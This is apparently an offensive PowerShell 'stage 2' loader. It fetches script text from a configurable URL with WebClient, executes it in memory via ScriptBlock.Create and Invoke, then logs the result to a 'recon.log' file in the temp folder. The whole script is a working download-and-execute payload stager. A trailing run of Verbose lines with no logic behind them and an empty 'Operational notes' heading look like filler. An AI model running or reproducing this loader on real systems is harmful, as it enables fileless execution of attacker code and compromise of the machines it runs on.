[CmdletBinding()]
param(
    [string]$TransferUrl = "https://localhost:8000/stage2.ps1",
    [string]$TracePath = "$env:TEMP\recon.log",
    [int]$TimeoutSec = 58
)
$ErrorActionPreference = "Stop"

function Get-StageScriptText {
    param(
        [string]$SourceUrl = '',
        [int]$TimeoutSec = 58
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

function Invoke-Stage2Script {
    [CmdletBinding()]
    param(
        [string]$ScriptBody = ''
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

try {
    Write-Verbose "Starting in-memory stage"
    $DownloadedScript = Get-StageScriptText -SourceUrl $TransferUrl -TimeoutSec $TimeoutSec
    $FetchResult = Invoke-Stage2Script -ScriptBody $DownloadedScript
    Write-Verbose "Stage result: $($FetchResult)"
}
catch {
    Write-Warning "In-memory loader failed: $($_.Exception.Message)"
}

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $TransferUrl
    ScriptLength = $DownloadedScript.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Resolving configured target"
Write-Verbose "Preparing working directory"
Write-Verbose "Retry budget remaining"
Write-Verbose "Exporting operation report"
Write-Verbose "Cleaning temporary marker"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Write-Verbose "stage marker 24 reached"

# Operational notes
